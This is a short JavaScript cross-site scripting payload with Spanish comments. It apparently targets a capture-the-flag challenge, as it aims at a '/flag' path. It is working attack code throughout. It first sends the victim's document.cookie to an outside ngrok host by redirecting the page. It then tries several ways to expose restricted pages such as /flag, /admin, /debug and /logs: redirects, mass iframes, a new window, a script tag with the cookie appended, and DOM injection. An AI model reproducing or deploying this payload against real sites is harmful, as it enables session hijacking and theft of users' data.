(function(){
    // ===== CONFIG =====
    const exfil = "https://radiological-myriam-balancedly.ngrok-free.dev";
    const targets = [
        "/flag",
        "/admin",
        "/dashboard",
        "/debug",
        "/api",
        "/report",
        "/logs",
        "/"
    ];

    // ===== 1. Intento: cookie leak =====
    try {
        location = exfil + "/?c=" + encodeURIComponent(document.cookie);
    } catch(e){}

    // ===== 2. Intento: redirección directa =====
    setTimeout(()=>{
        try { location = "/flag"; } catch(e){}
    }, 1000);

    // ===== 3. Intento: iframes masivos =====
    setTimeout(()=>{
        targets.forEach((p,i)=>{
            setTimeout(()=>{
                try {
                    let f = document.createElement("iframe");
                    f.src = p;
                    f.style = "width:100%;height:300px;border:1px solid red;";
                    document.body.appendChild(f);
                } catch(e){}
            }, i*500);
        });
    }, 2000);

    // ===== 4. Intento: abrir en ventana =====
    setTimeout(()=>{
        try { window.open("/flag","_blank"); } catch(e){}
    }, 4000);

    // ===== 5. Intento: script error (CSP report) =====
    setTimeout(()=>{
        try {
            let s = document.createElement("script");
            s.src = "/flag?leak=" + document.cookie;
            document.body.appendChild(s);
        } catch(e){}
    }, 5000);

    // ===== 6. Intento: sobrescribir DOM =====
    setTimeout(()=>{
        try {
            document.body.innerHTML += "<iframe src='/flag' style='width:100%;height:500px;'></iframe>";
        } catch(e){}
    }, 6000);

})();
